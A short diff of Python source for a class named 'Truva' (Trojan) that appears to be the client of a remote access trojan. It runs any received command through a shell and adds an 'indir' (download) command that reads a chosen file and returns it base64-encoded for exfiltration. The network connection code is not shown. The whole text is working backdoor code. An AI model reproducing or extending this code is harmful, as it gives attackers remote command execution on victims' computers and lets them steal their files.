@@ -2,6 +2,7 @@ import socket
 import subprocess
 import simplejson
 import os
+import base64
 
 class Truva:
 
@@ -18,6 +19,9 @@ class Truva:
         elif komut[0]=="cd" and len(komut)>1:
             os.chdir(komut[1])
             return komut[1] + " ulaşıldı."
+        elif komut[0]=="indir":
+            with open(komut[1],"rb") as dosya:
+                return base64.b64encode(dosya.read())
         else:
             return subprocess.check_output(komut, shell=True)
 
